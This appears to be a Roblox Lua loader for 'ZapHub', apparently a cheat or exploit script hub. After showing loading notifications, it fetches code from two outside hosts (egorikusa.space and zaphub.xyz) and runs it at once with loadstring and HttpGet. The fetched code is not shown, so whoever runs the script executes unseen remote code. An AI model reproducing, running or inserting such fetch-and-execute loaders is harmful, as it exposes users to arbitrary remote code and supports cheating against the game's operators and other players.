game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "ZapHub",
	Text = "Loading Utils..."
})
loadstring(game:HttpGet('https://egorikusa.space/78eede770504999a0cbdf477.lua'))()

game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "ZapHub",
	Text = "Loading ZapHub..."
})
loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()

game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "ZapHub",
	Text = "Finished loading."
})
